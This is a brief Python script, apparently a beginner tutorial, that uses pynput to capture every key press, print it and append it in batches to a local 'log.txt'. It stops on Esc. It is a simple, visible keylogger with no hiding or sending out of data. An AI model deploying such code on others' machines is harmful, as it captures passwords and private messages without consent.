import pynput

from pynput.keyboard import Key, Listener

#So that we are not updating the txt file every second. Once the user has entered a certain amount of keys, then we load
#it into the txt file.

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    #update the file after every 10 entries
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k == "Key.backspace":
                f.write("------Backspace------")
            if k.find("enter") > 0:
                f.write('\n')
            elif k.find("space") > 0:
                f.write(' ')
            elif k.find("Key") == -1:
                f.write(k)
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
